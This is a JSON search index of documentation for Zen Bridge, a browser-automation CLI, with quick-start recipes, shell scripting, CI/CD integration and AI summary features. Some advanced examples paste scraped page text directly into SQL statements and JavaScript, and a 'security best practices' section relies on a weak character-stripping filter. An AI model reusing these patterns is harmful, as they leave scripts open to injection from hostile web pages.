\"input[type=email]\"\n</code></pre>"},{"location":"getting-started/quick-start/#keyboard-control-mode","title":"Keyboard Control Mode","text":"<p>Navigate pages entirely with your keyboard:</p> <pre><code>zen control\n</code></pre> <p>Controls:</p> <ul> <li>Tab / Shift+Tab - Navigate forward/backward</li> <li>Up Down Left Right - Move focus directionally</li> <li>Enter / Space - Activate focused element</li> <li>Esc - Return to body</li> <li>Q - Quit control mode</li> </ul> <p>Features:</p> <ul> <li>Auto-refocus after page navigation</li> <li>Visual feedback (blue outlines)</li> <li>Real-time terminal announcements</li> <li>Optional text-to-speech (macOS)</li> </ul> <p>Control Mode Configuration</p> <p>Customize control mode behavior in <code>config.json</code>. See the Configuration Guide.</p>"},{"location":"getting-started/quick-start/#watch-browser-events","title":"Watch Browser Events","text":"<p>Monitor keyboard input in real-time:</p> <pre><code>zen watch input\n</code></pre> <p>Focus any text field in the browser and start typing. The terminal will show each keystroke:</p> <pre><code>Watching keyboard input... (Press Ctrl+C to stop)\nH e l l o [SPACE] W o r l d [ENTER]\n</code></pre> <p>Press Ctrl+C to stop watching.</p>"},{"location":"getting-started/quick-start/#execute-javascript-from-files","title":"Execute JavaScript from Files","text":"<p>Create a file <code>extract-titles.js</code>:</p> <pre><code>// Extract all headings from the page\nconst headings = Array.from(document.querySelectorAll('h1, h2, h3, h4, h5, h6'))\n  .map(h =&gt; ({\n    level: h.tagName,\n    text: h.textContent.trim(),\n    id: h.id\n  }));\n\nheadings;  // Return value\n</code></pre> <p>Execute it:</p> <pre><code>zen exec extract-titles.js --format json\n</code></pre> <p>Or use the shorthand:</p> <pre><code>zen exec extract-titles.js --format json\n# Same as:\nzen eval --file extract-titles.js --format json\n</code></pre>"},{"location":"getting-started/quick-start/#working-with-output-formats","title":"Working with Output Formats","text":"<p>Zen Bridge supports multiple output formats:</p> Default (Human-Readable)JSONRaw <pre><code>zen eval \"({title: document.title, url: location.href})\"\n</code></pre> <p>Output: <pre><code>{\n  title: \"Example Domain\",\n  url: \"https://example.com/\"\n}\n</code></pre></p> <pre><code>zen eval \"({title: document.title, url: location.href})\" --format json\n</code></pre> <p>Output: <pre><code>{\n  \"title\": \"Example Domain\",\n  \"url\": \"https://example.com/\"\n}\n</code></pre></p> <pre><code>zen eval \"document.title\" --format raw\n</code></pre> <p>Output: <pre><code>Example Domain\n</code></pre></p> <p>No extra formatting - perfect for piping to other commands.</p>"},{"location":"getting-started/quick-start/#combining-with-shell-commands","title":"Combining with Shell Commands","text":"<p>Zen Bridge plays nicely with standard Unix tools:</p> <pre><code># Count external links\nzen links --only-external --only-urls | wc -l\n\n# Find all PDF links\nzen links --only-urls | grep \"\\.pdf$\"\n\n# Get unique domains from external links\nzen links --only-external --only-urls | sed 's|https\\?://\\([^/]*\\).*|\\1|' | sort | uniq\n\n# Export data and process with jq\nzen eval \"Array.from(document.querySelectorAll('a')).map(a =&gt; ({text: a.textContent, href: a.href}))\" --format json | jq '.[0:5]'\n</code></pre>"},{"location":"getting-started/quick-start/#common-patterns-and-recipes","title":"Common Patterns and Recipes","text":""},{"location":"getting-started/quick-start/#check-if-element-exists","title":"Check if Element Exists","text":"<pre><code>zen eval \"document.querySelector('#element-id') !== null\"\n# =&gt; true or false\n</code></pre>"},{"location":"getting-started/quick-start/#get-computed-style","title":"Get Computed Style","text":"<pre><code>zen eval \"getComputedStyle(document.querySelector('h1')).color\"\n# =&gt; rgb(0, 0, 0)\n</code></pre>"},{"location":"getting-started/quick-start/#scroll-to-bottom","title":"Scroll to Bottom","text":"<pre><code>zen eval \"window.scrollTo(0, document.body.scrollHeight)\"\n</code></pre>"},{"location":"getting-started/quick-start/#take-screenshot-of-element","title":"Take Screenshot of Element","text":"<pre><code># Screenshot by selector\nzen screenshot --selector \"h1\" --output screenshot.png\n\n# Screenshot inspected element (set in DevTools)\nzen screenshot --selector \"$0\" --output element.png\n</code></pre>"},{"location":"getting-started/quick-start/#monitor-for-changes","title":"Monitor for Changes","text":"<pre><code># Check element count every 5 seconds\nwhile true; do\n  zen eval \"document.querySelectorAll('.notification').length\" --format raw\n  sleep 5\ndone\n</code></pre>"},{"location":"getting-started/quick-start/#extract-and-download-files","title":"Extract and Download Files","text":"<pre><code># Interactive file finder\nzen download\n\n# List all downloadable files\nzen download --list\n\n# Custom output directory\nzen download --output ~/Downloads\n</code></pre>"},{"location":"getting-started/quick-start/#troubleshooting-tips","title":"Troubleshooting Tips","text":""},{"location":"getting-started/quick-start/#command-hangs-or-times-out","title":"Command Hangs or Times Out","text":"<pre><code># Increase timeout (in seconds)\nzen eval \"slowOperation()\" --timeout 30\n</code></pre>"},{"location":"getting-started/quick-start/#no-response-from-browser","title":"\"No response from browser\"","text":"<ol> <li>Ensure browser tab is active (not in background)</li> <li>Check browser console for errors (F12)</li> <li>Verify WebSocket connection in console:    <pre><code>// Should see \"Connected to Zen Bridge WebSocket server\"\n</code></pre></li> </ol>"},{"location":"getting-started/quick-start/#check-server-status","title":"Check Server Status","text":"<pre><code>zen server status\n</code></pre> <p>If server isn't running:</p> <pre><code>zen server start --daemon\n</code></pre>"},{"location":"getting-started/quick-start/#next-steps","title":"Next Steps","text":"<p>Now that you've mastered the basics, explore these resources:</p> <ul> <li> <p> Configuration</p> <p>Customize Zen Bridge for your workflow - control mode, AI settings, and more.</p> <p> Configuration Guide</p> </li> <li> <p> User Guide</p> <p>Deep dive into all commands, features, and advanced usage patterns.</p> <p> User Guide</p> </li> <li> <p> Built-in Scripts</p> <p>Explore ready-to-use scripts for common tasks like data extraction and SEO analysis.</p> <p> Advanced Scripting</p> </li> <li> <p> API Reference</p> <p>Complete command reference with all flags and options.</p> <p> CLI Commands</p> </li> </ul>"},{"location":"getting-started/quick-start/#practice-challenges","title":"Practice Challenges","text":"<p>Try these exercises to build your skills:</p> <p>Challenge 1: Link Analysis</p> <p>Navigate to your favorite news site and:</p> <ol> <li>Count total links on the homepage</li> <li>Extract all external links</li> <li>Find all links containing \"privacy\" or \"terms\"</li> <li>Save results to a file</li> </ol> Solution <pre><code># 1. Count total links\nzen eval \"document.querySelectorAll('a').length\"\n\n# 2. Extract external links\nzen links --only-external --only-urls &gt; external.txt\n\n# 3. Find privacy/terms links\nzen links --only-urls | grep -E \"(privacy|terms)\"\n\n# 4. Already saved in step 2!\n</code></pre> <p>Challenge 2: Form Automation</p> <p>Find a demo contact form online and:</p> <ol> <li>Fill all fields programmatically</li> <li>Submit the form</li> <li>Wait for success message</li> <li>Extract the success message text</li> </ol> Solution <pre><code># 1. Fill fields\nzen eval \"document.querySelector('#name').value = 'John Doe'\"\nzen eval \"document.querySelector('#email').value = 'john@example.com'\"\nzen eval \"document.querySelector('#message').value = 'Hello!'\"\n\n# 2. Submit\nzen click \"button[type=submit]\"\n\n# 3. Wait for success\nzen wait \".success-message\" --visible\n\n# 4. Extract message\nzen eval \"document.querySelector('.success-message').textContent\"\n</code></pre> <p>Challenge 3: Data Extraction</p> <p>Navigate to a Wikipedia article and:</p> <ol> <li>Get the article title</li> <li>Count all sections (h2 headings)</li> <li>Extract all image URLs</li> <li>Create JSON with all the data</li> </ol> Solution <pre><code># 1. Get title\nzen eval \"document.querySelector('h1').textContent\"\n\n# 2. Count sections\nzen eval \"document.querySelectorAll('h2').length\"\n\n# 3. Extract images\nzen eval \"Array.from(document.querySelectorAll('img')).map(img =&gt; img.src)\"\n\n# 4. Create JSON\nzen eval \"{\n  title: document.querySelector('h1').textContent,\n  sections: document.querySelectorAll('h2').length,\n  images: Array.from(document.querySelectorAll('img')).map(img =&gt; img.src)\n}\" --format json &gt; wikipedia.json\n</code></pre>"},{"location":"getting-started/quick-start/#quick-reference-card","title":"Quick Reference Card","text":"Task Command Execute JavaScript <code>zen eval \"code\"</code> Interactive REPL <code>zen repl</code> Page info <code>zen info</code> Extract links <code>zen links</code> Click element <code>zen click \"selector\"</code> Wait for element <code>zen wait \"selector\" --visible</code> Highlight elements <code>zen highlight \"selector\"</code> Page outline <code>zen outline</code> AI summary <code>zen summarize</code> Page description <code>zen describe</code> Keyboard control <code>zen control</code> Watch events <code>zen watch input</code> Server status <code>zen server status</code> Get help <code>zen --help</code> <p>Happy automating! If you run into any issues, check the Troubleshooting section or open an issue on GitHub.</p>"},{"location":"guide/advanced/","title":"Advanced Usage","text":"<p>Master advanced patterns for Zen Bridge. Learn scripting techniques, shell integration, automation workflows, CI/CD integration, and performance optimization.</p>"},{"location":"guide/advanced/#overview","title":"Overview","text":"<p>This guide covers advanced topics for power users:</p> <ul> <li>Shell integration and aliases</li> <li>Scripting patterns</li> <li>Automation workflows</li> <li>CI/CD integration</li> <li>Performance optimization</li> <li>Security best practices</li> </ul>"},{"location":"guide/advanced/#shell-integration","title":"Shell Integration","text":""},{"location":"guide/advanced/#bashzsh-functions","title":"Bash/Zsh Functions","text":"<p>Add these to your <code>.bashrc</code> or <code>.zshrc</code>:</p> <pre><code># Quick page title\nzt() {\n  zen eval \"document.title\" --format raw\n}\n\n# Quick URL\nzu() {\n  zen eval \"location.href\" --format raw\n}\n\n# Extract all links\nzlinks() {\n  zen links --only-urls\n}\n\n# Count elements\nzcount() {\n  local selector=\"${1:-.item}\"\n  zen eval \"document.querySelectorAll('$selector').length\" --format raw\n}\n\n# Monitor element content\nzwatch() {\n  local selector=\"${1:-.main}\"\n  watch -n 5 \"zen eval \\\"document.querySelector('$selector').textContent\\\" --format raw\"\n}\n\n# Quick screenshot\nzscreen() {\n  local selector=\"${1:-body}\"\n  local output=\"screenshot-$(date +%Y%m%d-%H%M%S).png\"\n  zen screenshot --selector \"$selector\" --output \"$output\"\n  echo \"Saved: $output\"\n}\n</code></pre>"},{"location":"guide/advanced/#useful-aliases","title":"Useful Aliases","text":"<pre><code># Short commands\nalias z='zen'\nalias ze='zen eval'\nalias zx='zen exec'\nalias zi='zen info'\nalias zl='zen links'\nalias zr='zen repl'\n\n# Common operations\nalias zt='zen eval \"document.title\" --format raw'\nalias zu='zen eval \"location.href\" --format raw'\nalias zlc='zen links --only-urls | wc -l'  # Link count\n</code></pre>"},{"location":"guide/advanced/#shell-completions","title":"Shell Completions","text":"<p>Create completions for your shell:</p> <p>Bash: <pre><code># ~/.bash_completion.d/zen\n_zen_completion() {\n  local cur prev commands\n  cur=\"${COMP_WORDS[COMP_CURS]}\"\n  prev=\"${COMP_WORDS[COMP_CURS-1]}\"\n\n  commands=\"eval exec info repl server click wait send inspect links outline selected download summarize describe control\"\n\n  if [ $COMP_CWORD -eq 1 ]; then\n    COMPREPLY=($(compgen -W \"$commands\" -- \"$cur\"))\n  fi\n}\n\ncomplete -F _zen_completion zen\n</code></pre></p>"},{"location":"guide/advanced/#scripting-patterns","title":"Scripting Patterns","text":""},{"location":"guide/advanced/#error-handling","title":"Error Handling","text":"<p>Basic error checking: <pre><code>#!/bin/bash\n\nif ! result=$(zen eval \"document.title\" 2&gt;&amp;1); then\n  echo \"Error: $result\" &gt;&amp;2\n  exit 1\nfi\n\necho \"Title: $result\"\n</code></pre></p> <p>Graceful degradation: <pre><code>#!/bin/bash\n\n# Try to get title, fallback to URL\ntitle=$(zen eval \"document.title\" --format raw 2&gt;/dev/null)\nif [ -z \"$title\" ]; then\n  title=$(zen eval \"location.href\" --format raw)\nfi\n\necho \"$title\"\n</code></pre></p>"},{"location":"guide/advanced/#retry-logic","title":"Retry Logic","text":"<pre><code>#!/bin/bash\n\nretry_command() {\n  local max_attempts=3\n  local attempt=1\n  local delay=2\n\n  while [ $attempt -le $max_attempts ]; do\n    echo \"Attempt $attempt/$max_attempts...\"\n\n    if \"$@\"; then\n      return 0\n    fi\n\n    if [ $attempt -lt $max_attempts ]; then\n      echo \"Failed. Retrying in ${delay}s...\"\n      sleep $delay\n      delay=$((delay * 2))\n    fi\n\n    attempt=$((attempt + 1))\n  done\n\n  echo \"All attempts failed\" &gt;&amp;2\n  return 1\n}\n\n# Usage\nretry_command zen eval \"document.querySelector('.dynamic-content').textContent\"\n</code></pre>"},{"location":"guide/advanced/#timeout-handling","title":"Timeout Handling","text":"<pre><code>#!/bin/bash\n\n# Run with timeout\ntimeout 30 zen eval \"await slowOperation()\" --timeout 30 || {\n  echo \"Command timed out\"\n  exit 1\n}\n</code></pre>"},{"location":"guide/advanced/#parallel-execution","title":"Parallel Execution","text":"<pre><code>#!/bin/bash\n\n# Extract data from multiple pages in parallel\nurls=(\n  \"https://example.com/page1\"\n  \"https://example.com/page2\"\n  \"https://example.com/page3\"\n)\n\npids=()\n\nfor url in \"${urls[@]}\"; do\n  (\n    echo \"Processing: $url\"\n    zen open \"$url\" --wait\n    title=$(zen eval \"document.title\" --format raw)\n    links=$(zen links --only-urls | wc -l)\n    echo \"$url,$title,$links\" &gt;&gt; results.csv\n  ) &amp;\n  pids+=($!)\ndone\n\n# Wait for all to complete\nfor pid in \"${pids[@]}\"; do\n  wait \"$pid\"\ndone\n\necho \"All pages processed\"\n</code></pre>"},{"location":"guide/advanced/#automation-workflows","title":"Automation Workflows","text":""},{"location":"guide/advanced/#multi-step-form-workflow","title":"Multi-Step Form Workflow","text":"<pre><code>#!/bin/bash\n# Automated form filling and submission\n\necho \"Starting form automation...\"\n\n# Navigate to form page\nzen open \"https://example.com/contact\"\n\n# Wait for page load\nzen wait \"form\" --visible\n\n# Fill form fields\nzen send \"John Doe\" --selector \"#name\"\nzen send \"john@example.com\" --selector \"#email\"\nzen send \"This is a test message\" --selector \"#message\"\n\n# Check checkbox\nzen eval \"document.querySelector('#agree').checked = true\"\n\n# Submit form\nzen click \"#submit-btn\"\n\n# Wait for success message\nzen wait \".success-message\" --visible --timeout 10\n\n# Get confirmation\nconfirmation=$(zen eval \"document.querySelector('.success-message').textContent\" --format raw)\necho \"Success: $confirmation\"\n</code></pre>"},{"location":"guide/advanced/#data-scraping-workflow","title":"Data Scraping Workflow","text":"<pre><code>#!/bin/bash\n# Scrape product data from multiple pages\n\noutput_file=\"products.jsonl\"\nbase_url=\"https://example.com/products\"\ntotal_pages=5\n\n&gt; \"$output_file\"  # Clear file\n\nfor page in $(seq 1 $total_pages); do\n  echo \"Scraping page $page/$total_pages...\"\n\n  # Navigate\n  zen open \"${base_url}?page=${page}\" --wait\n\n  # Wait for products to load\n  zen wait \".product\" --visible\n\n  # Extract data\n  zen eval \"\n    Array.from(document.querySelectorAll('.product')).map(p =&gt; ({\n      name: p.querySelector('.product-name')?.textContent.trim(),\n      price: p.querySelector('.product-price')?.textContent.trim(),\n      rating: p.querySelector('.rating')?.textContent.trim(),\n      image: p.querySelector('img')?.src,\n      url: p.querySelector('a')?.href\n    }))\n  \" --format json | jq -c '.[]' &gt;&gt; \"$output_file\"\n\n  echo \"Page $page complete\"\n  sleep 2  # Be polite\ndone\n\necho \"Scraping complete. Total products: $(wc -l &lt; \"$output_file\")\"\n</code></pre>"},{"location":"guide/advanced/#monitoring-workflow","title":"Monitoring Workflow","text":"<pre><code>#!/bin/bash\n# Monitor page for changes and alert\n\nurl=\"https://example.com/status\"\nselector=\".status-indicator\"\ncheck_interval=300  # 5 minutes\nlast_status=\"\"\n\necho \"Monitoring: $url\"\necho \"Selector: $selector\"\necho \"Interval: ${check_interval}s\"\n\nwhile true; do\n  # Navigate and extract status\n  zen open \"$url\" --wait\n  current_status=$(zen eval \"document.querySelector('$selector').textContent\" --format raw)\n\n  # Check for changes\n  if [ -n \"$last_status\" ] &amp;&amp; [ \"$current_status\" != \"$last_status\" ]; then\n    echo \"Status changed: $last_status \u2192 $current_status\"\n\n    # Send alert (macOS)\n    osascript -e \"display notification \\\"Status: $current_status\\\" with title \\\"Page Monitor\\\"\"\n\n    # Or send email\n    # echo \"Status changed to: $current_status\" | mail -s \"Alert\" user@example.com\n  fi\n\n  last_status=\"$current_status\"\n  echo \"$(date): $current_status\"\n\n  sleep \"$check_interval\"\ndone\n</code></pre>"},{"location":"guide/advanced/#authenticated-data-extraction","title":"Authenticated Data Extraction","text":"<pre><code>#!/bin/bash\n# Extract data from pages requiring authentication\n\n# Credentials (use environment variables in production)\nUSERNAME=\"${ZEN_USERNAME:-user@example.com}\"\nPASSWORD=\"${ZEN_PASSWORD:-password}\"\n\n# Navigate to login page\nzen open \"https://example.com/login\"\n\n# Fill login form\nzen send \"$USERNAME\" --selector \"input[name=email]\"\nzen send \"$PASSWORD\" --selector \"input[name=password]\"\n\n# Submit\nzen click \"button[type=submit]\"\n\n# Wait for dashboard\nzen wait \".dashboard\" --visible --timeout 15\n\n# Extract dashboard data\nzen eval \"\n  Array.from(document.querySelectorAll('.stat')).map(stat =&gt; ({\n    label: stat.querySelector('.label')?.textContent.trim(),\n    value: stat.querySelector('.value')?.textContent.trim()\n  }))\n\" --format json &gt; dashboard-data.json\n\necho \"Data extracted to dashboard-data.json\"\n</code></pre>"},{"location":"guide/advanced/#cicd-integration","title":"CI/CD Integration","text":""},{"location":"guide/advanced/#github-actions","title":"GitHub Actions","text":"<p>.github/workflows/browser-tests.yml: <pre><code>name: Browser Tests\n\non: [push, pull_request]\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v3\n\n      - name: Set up Python\n        uses: actions/setup-python@v4\n        with:\n          python-version: '3.11'\n\n      - name: Install Zen Bridge\n        run: |\n          pip install -e .\n\n      - name: Install userscript manager\n        run: |\n          # Install browser and extension\n          # (implementation depends on your setup)\n\n      - name: Start Zen Bridge server\n        run: |\n          zen server start --daemon\n          sleep 2\n\n      - name: Run browser tests\n        run: |\n          zen open \"file://$PWD/tests/test-page.html\" --wait\n          zen eval \"typeof runTests === 'function'\" --format raw\n          result=$(zen eval \"runTests()\" --format json)\n          echo \"$result\"\n\n          # Check results\n          failed=$(echo \"$result\" | jq -r '.failed')\n          if [ \"$failed\" -gt 0 ]; then\n            echo \"Tests failed!\"\n            exit 1\n          fi\n\n      - name: Stop server\n        if: always()\n        run: pkill -f \"zen server\"\n</code></pre></p>"},{"location":"guide/advanced/#gitlab-ci","title":"GitLab CI","text":"<p>.gitlab-ci.yml: <pre><code>test:\n  image: python:3.11\n  before_script:\n    - pip install -e .\n    - zen server start --daemon\n  script:\n    - zen open \"file://$CI_PROJECT_DIR/tests/test-page.html\" --wait\n    - zen eval \"runTests()\" --format json &gt; results.json\n    - test $(jq -r '.failed' results.json) -eq 0\n  after_script:\n    - pkill -f \"zen server\"\n</code></pre></p>"},{"location":"guide/advanced/#pre-commit-hook","title":"Pre-commit Hook","text":"<p>.git/hooks/pre-commit: <pre><code>#!/bin/bash\n\necho \"Running browser tests...\"\n\n# Start server if not running\nif ! zen server status &amp;&gt;/dev/null; then\n  zen server start --daemon\n  sleep 2\n  cleanup=true\nfi\n\n# Run tests\nzen open \"file://$(pwd)/tests/index.html\" --wait\n\nresult=$(zen eval \"\n  if (typeof runTests !== 'function') {\n    return {error: 'runTests not found'};\n  }\n  return runTests();\n\" --format json)\n\nfailed=$(echo \"$result\" | jq -r '.failed // 0')\n\n# Cleanup if we started the server\nif [ \"$cleanup\" = \"true\" ]; then\n  pkill -f \"zen server\"\nfi\n\n# Check results\nif [ \"$failed\" -gt 0 ]; then\n  echo \"Tests failed! Commit aborted.\"\n  echo \"$result\" | jq '.'\n  exit 1\nfi\n\necho \"All tests passed!\"\n</code></pre></p>"},{"location":"guide/advanced/#data-processing","title":"Data Processing","text":""},{"location":"guide/advanced/#json-processing-with-jq","title":"JSON Processing with jq","text":"<pre><code># Extract specific fields\nzen eval \"Array.from(document.querySelectorAll('.item')).map(i =&gt; ({\n  title: i.querySelector('.title').textContent,\n  price: i.querySelector('.price').textContent\n}))\" --format json | jq '.[] | {title, price}'\n\n# Filter results\nzen links --json | jq '.links[] | select(.internal == false)'\n\n# Aggregate data\nzen links --json | jq '.links | group_by(.internal) | map({internal: .[0].internal, count: length})'\n\n# Transform format\nzen info --json | jq '{page: .title, link: .url, domain: .domain}'\n</code></pre>"},{"location":"guide/advanced/#csv-export","title":"CSV Export","text":"<pre><code># Export links to CSV\necho \"text,url,internal\" &gt; links.csv\nzen links --json | jq -r '.links[] | [.text, .url, .internal] | @csv' &gt;&gt; links.csv\n\n# Export table data\nzen eval \"\n  const table = document.querySelector('table');\n  const headers = Array.from(table.querySelectorAll('th')).map(th =&gt; th.textContent);\n  const rows = Array.from(table.querySelectorAll('tbody tr')).map(tr =&gt;\n    Array.from(tr.cells).map(cell =&gt; cell.textContent)\n  );\n  return {headers, rows};\n\" --format json | jq -r '\n  .headers,\n  (.rows[] | @csv)\n' &gt; table.csv\n</code></pre>"},{"location":"guide/advanced/#database-integration","title":"Database Integration","text":"<p>SQLite: <pre><code>#!/bin/bash\n\ndb_file=\"pages.db\"\n\n# Create table\nsqlite3 \"$db_file\" \"CREATE TABLE IF NOT EXISTS pages (\n  id INTEGER PRIMARY KEY,\n  url TEXT,\n  title TEXT,\n  link_count INTEGER,\n  scraped_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n)\"\n\n# Extract and insert data\nurl=$(zen eval \"location.href\" --format raw)\ntitle=$(zen eval \"document.title\" --format raw)\nlink_count=$(zen links --only-urls | wc -l)\n\nsqlite3 \"$db_file\" \"INSERT INTO pages (url, title, link_count) VALUES (\n  '$url', '$title', $link_count\n)\"\n\necho \"Data saved to $db_file\"\n</code></pre></p> <p>PostgreSQL: <pre><code>#!/bin/bash\n\n# Export environment variables for psql\nexport PGHOST=\"localhost\"\nexport PGDATABASE=\"scraping\"\nexport PGUSER=\"scraper\"\n\n# Extract and insert\ndata=$(zen eval \"({\n  url: location.href,\n  title: document.title,\n  links: Array.from(document.links).length\n})\" --format json)\n\nurl=$(echo \"$data\" | jq -r '.url')\ntitle=$(echo \"$data\" | jq -r '.title')\nlinks=$(echo \"$data\" | jq -r '.links')\n\npsql -c \"INSERT INTO pages (url, title, link_count) VALUES ('$url', '$title', $links)\"\n</code></pre></p>"},{"location":"guide/advanced/#performance-optimization","title":"Performance Optimization","text":""},{"location":"guide/advanced/#batch-operations","title":"Batch Operations","text":"<pre><code># Good - single execution\nzen eval \"({\n  title: document.title,\n  url: location.href,\n  links: document.links.length,\n  images: document.images.length,\n  forms: document.forms.length\n})\" --format json\n\n# Avoid - multiple executions\n# zen eval \"document.title\"\n# zen eval \"location.href\"\n# zen eval \"document.links.length\"\n# ...\n</code></pre>"},{"location":"guide/advanced/#efficient-selectors","title":"Efficient Selectors","text":"<pre><code># Good - specific selectors\nzen eval \"document.querySelectorAll('.product .price')\"\n\n# Avoid - overly broad selectors\nzen eval \"document.querySelectorAll('*')\"\n</code></pre>"},{"location":"guide/advanced/#caching-results","title":"Caching Results","text":"<pre><code>#!/bin/bash\n\ncache_dir=\"$HOME/.zen-cache\"\ncache_ttl=300  # 5 minutes\n\nmkdir -p \"$cache_dir\"\n\nget_cached_or_fetch() {\n  local key=\"$1\"\n  local command=\"$2\"\n  local cache_file=\"$cache_dir/$(echo \"$key\" | md5sum | cut -d' ' -f1)\"\n\n  # Check cache\n  if [ -f \"$cache_file\" ]; then\n    age=$(($(date +%s) - $(stat -c %Y \"$cache_file\")))\n    if [ $age -lt $cache_ttl ]; then\n      cat \"$cache_file\"\n      return 0\n    fi\n  fi\n\n  # Fetch and cache\n  result=$(eval \"$command\")\n  echo \"$result\" &gt; \"$cache_file\"\n  echo \"$result\"\n}\n\n# Usage\ntitle=$(get_cached_or_fetch \"page-title\" \"zen eval 'document.title' --format raw\")\n</code></pre>"},{"location":"guide/advanced/#minimize-dom-queries","title":"Minimize DOM Queries","text":"<pre><code># Good - query once, reuse\nzen eval \"\n  const container = document.querySelector('.container');\n  const items = container.querySelectorAll('.item');\n  return Array.from(items).map(item =&gt; ({\n    title: item.querySelector('.title').textContent,\n    link: item.querySelector('a').href\n  }));\n\"\n\n# Avoid - querying repeatedly\nzen eval \"\n  Array.from(document.querySelectorAll('.item')).map(item =&gt; ({\n    title: document.querySelector('.container .item .title').textContent,\n    link: document.querySelector('.container .item a').href\n  }));\n\"\n</code></pre>"},{"location":"guide/advanced/#security-best-practices","title":"Security Best Practices","text":""},{"location":"guide/advanced/#input-sanitization","title":"Input Sanitization","text":"<pre><code>#!/bin/bash\n\nsanitize_input() {\n  # Remove potentially dangerous characters\n  echo \"$1\" | sed 's/[;&amp;|`$(){}]//g' | sed \"s/'//g\"\n}\n\nuser_input=$(sanitize_input \"$1\")\n\nzen eval \"document.querySelector('#search').value = '$user_input'\"\n</code></pre>"},{"location":"guide/advanced/#credential-management","title":"Credential Management","text":"<pre><code># Use environment variables\nexport ZEN_USERNAME=\"user@example.com\"\nexport ZEN_PASSWORD=\"secure_password\"\n\n# Or use a secrets manager\n# export ZEN_USERNAME=$(vault read -field=username secret/zen)\n# export ZEN_PASSWORD=$(vault read -field=password secret/zen)\n\nzen send \"$ZEN_USERNAME\" --selector \"#username\"\nzen send \"$ZEN_PASSWORD\" --selector \"#password\"\n</code></pre>"},{"location":"guide/advanced/#avoid-logging-sensitive-data","title":"Avoid Logging Sensitive Data","text":"<pre><code>#!/bin/bash\n\n# Good - don't log passwords\nlog_message \"Logging in as $ZEN_USERNAME\"\n\n# Avoid\n# log_message \"Login: $ZEN_USERNAME / $ZEN_PASSWORD\"\n</code></pre>"},{"location":"guide/advanced/#audit-logging","title":"Audit Logging","text":"<pre><code>#!/bin/bash\n\nlog_file=\"$HOME/.zen-audit.log\"\n\nlog_action() {\n  echo \"$(date -u +%Y-%m-%dT%H:%M:%SZ) | $USER | $*\" &gt;&gt; \"$log_file\"\n}\n\n# Log all commands\ncommand=\"$*\"\nlog_action \"$command\"\nzen $command\n</code></pre>"},{"location":"guide/advanced/#best-practices-summary","title":"Best Practices Summary","text":""},{"location":"guide/advanced/#1-use-specific-selectors","title":"1. Use Specific Selectors","text":"<pre><code># Good\nzen click \"#submit-btn\"\nzen eval \"document.querySelector('.product[data-id=\\\"123\\\"]')\"\n\n# Avoid\nzen click \"button\"\nzen eval \"document.querySelector('div div div button')\"\n</code></pre>"},{"location":"guide/advanced/#2-handle-errors-gracefully","title":"2. Handle Errors Gracefully","text":"<pre><code># Good\nzen eval \"document.querySelector('.optional')?.textContent || 'Not found'\"\n\n# Avoid (may crash)\nzen eval \"document.querySelector('.optional').textContent\"\n</code></pre>"},{"location":"guide/advanced/#3-batch-related-operations","title":"3. Batch Related Operations","text":"<pre><code># Good - single command\nzen eval \"({title: document.title, links: document.links.length})\"\n\n# Avoid - multiple commands\n# zen eval \"document.title\"\n# zen eval \"document.links.length\"\n</code></pre>"},{"location":"guide/advanced/#4-use-appropriate-timeouts","title":"4. Use Appropriate Timeouts","text":"<pre><code># Quick operations\nzen eval \"document.title\" --timeout 5\n\n# Slow operations\nzen eval \"await fetch('/api/data').then(r =&gt; r.json())\" --timeout 30\n</code></pre>"},{"location":"guide/advanced/#5-test-in-different-browsers","title":"5. Test in Different Browsers","text":"<p>Different browsers have different behaviors. Test your scripts in: - Chrome/Chromium - Firefox - Safari - Edge</p>"},{"location":"guide/advanced/#troubleshooting","title":"Troubleshooting","text":""},{"location":"guide/advanced/#command-hangs","title":"Command Hangs","text":"<pre><code># Reduce timeout\nzen eval \"document.title\" --timeout 5\n\n# Check for infinite loops\nzen eval \"console.log('test'); document.title\"\n</code></pre>"},{"location":"guide/advanced/#high-memory-usage","title":"High Memory Usage","text":"<pre><code># Limit results\nzen eval \"Array.from(document.querySelectorAll('.item')).slice(0, 100)\"\n\n# Clear caches periodically\nrm -rf \"$HOME/.zen-cache\"/*\n</code></pre>"},{"location":"guide/advanced/#rate-limiting","title":"Rate Limiting","text":"<pre><code># Add delays between requests\nfor url in \"${urls[@]}\"; do\n  zen open \"$url\" --wait\n  zen eval \"document.title\"\n  sleep 2  # Be polite\ndone\n</code></pre>"},{"location":"guide/advanced/#next-steps","title":"Next Steps","text":"<ul> <li>Explore the API Reference for complete command documentation</li> <li>Read Architecture Guide for system design</li> <li>Check Contributing Guide to contribute</li> </ul> <p>For additional examples and documentation, see the project repository root files.</p>"},{"location":"guide/advanced/#resources","title":"Resources","text":"<ul> <li>jq Manual</li> <li>Bash Guide</li> <li>CSS Selectors Reference</li> <li>JavaScript Reference</li> </ul>"},{"location":"guide/ai-features/","title":"AI Features","text":"<p>Master AI-powered features in Zen Bridge. Learn how to generate article summaries, create page descriptions for accessibility, and configure AI integration with mods.</p>"},{"location":"guide/ai-features/#overview","title":"Overview","text":"<p>Zen Bridge integrates with AI through mods to provide two powerful features:</p> <ul> <li><code>zen summarize</code> - Generate concise article summaries</li> <li><code>zen describe</code> - Create accessible page descriptions for screen readers</li> </ul> <p>Both commands extract page content and use AI to generate natural-language output.</p>"},{"location":"guide/ai-features/#prerequisites","title":"Prerequisites","text":""},{"location":"guide/ai-features/#install-mods","title":"Install mods","text":"<p>AI features require mods to be installed:</p> <pre><code># macOS/Linux\nbrew install charmbracelet/tap/mods\n\n# Or with go\ngo install github.com/charmbracelet/mods@latest\n</code></pre>"},{"location":"guide/ai-features/#configure-mods","title":"Configure mods","text":"<p>On first run, mods will prompt you to configure an AI provider:</p> <pre><code>mods\n</code></pre> <p>Supported providers: - OpenAI (GPT-3.5, GPT-4) - Anthropic (Claude) - Ollama (local models) - Azure OpenAI - And more...</p> <p>Set your API key:</p> <pre><code># OpenAI\nexport OPENAI_API_KEY=\"your-key-here\"\n\n# Anthropic\nexport ANTHROPIC_API_KEY=\"your-key-here\"\n\n# Or configure via mods\nmods --settings\n</code></pre>"},{"location":"guide/ai-features/#article-summarization","title":"Article Summarization","text":"<p>The <code>zen summarize</code> command extracts article content and generates a concise summary.</p>"},{"location":"guide/ai-features/#basic-usage","title":"Basic Usage","text":"<pre><code>zen summarize\n</code></pre> <p>Example output: <pre><code>This article discusses the importance of web accessibility and provides\npractical techniques for making websites more inclusive. Key points include\nsemantic HTML, ARIA 